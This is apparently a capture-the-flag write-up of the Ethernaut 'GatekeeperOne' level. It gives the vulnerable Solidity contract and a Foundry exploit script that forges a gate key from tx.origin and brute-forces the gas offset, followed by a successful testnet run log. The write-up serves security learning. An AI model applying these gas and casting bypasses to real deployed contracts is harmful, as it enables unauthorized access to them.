---
layout: post
title: "[Ethernaut] GateKeeper One"
tags: blockchain ethernaut foundry
---

# Analysis

---

The goal is

1. Make it past the gatekeeper and register as an entrant to pass this level.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

[Solidity 0.8.30 Documentation - units and global variables](https://docs.soliditylang.org/en/latest/units-and-global-variables.html)

> 💡 `gasleft() returns (uint256)`: remaining gas

[Solidity 0.8.30 Documentation - external function calls](https://docs.soliditylang.org/en/latest/control-structures.html#external-function-calls)

> 💡 When calling functions of other contracts, you can specify the amount of Wei or gas sent with the call with the special options `{value: 10, gas: 10000}`. Note that it is discouraged to specify gas values explicitly, since the gas costs of opcodes can change in the future.

# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Ex {
    function ex(GatekeeperOne gko_) external returns (uint){
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        for(uint i=0; i<=350; i++) {
            (bool result,) = address(gko_).call{gas: i+(8191*3)}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if(result) {
                return i;
            }
        }
    }
}

contract GateKeeperOneSol is Script {
    GatekeeperOne public gko_ = GatekeeperOne(0x8905857EFf6E619C391C6a828B62F86f2D15CCf8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    
        console.log("Before entrant: ", gko_.entrant());
        Ex ex = new Ex();
        console.log("gas: ", ex.ex(gko_));
        console.log("After entrant: ", gko_.entrant());

        vm.stopBroadcast();
    }
}
```

```bash
$ forge script script/GateKeeperOneSol.sol --tc GateKeeperOneSol --broadcast
[⠊] Compiling...
No files changed, compilation skipped
Script ran successfully.

== Logs ==
  Before entrant:  0x0000000000000000000000000000000000000000
  gas:  256
  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514

## Setting up 1 EVM.

==========================

Chain 17000

Estimated gas price: 0.001016731 gwei

Estimated total gas used for script: 987058

Estimated amount required: 0.000001003572467398 ETH

==========================

##### holesky
✅  [Success] Hash: 0x4a586d22227da1b4e2ea917dace32511f929924c727de6b803583281190d3fc7
Block: 3700680
Paid: 0.000000434849804628 ETH (427697 gas * 0.001016724 gwei)

##### holesky
✅  [Success] Hash: 0xfb2ec0646fe566660746a9b0d4bee577abc05e255f4e08aec3dfd7368faaf944
Contract Address: 0xBD597a280DC80c5f4D76A6Ccf23FAA6b00f721e3
Block: 3700680
Paid: 0.000000282768228708 ETH (278117 gas * 0.001016724 gwei)

✅ Sequence #1 on holesky | Total Paid: 0.000000717618033336 ETH (705814 gas * avg 0.001016724 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
```

![Image complete]({{site.url}}/images/2025-04-22-GateKeeper-One/complete.png)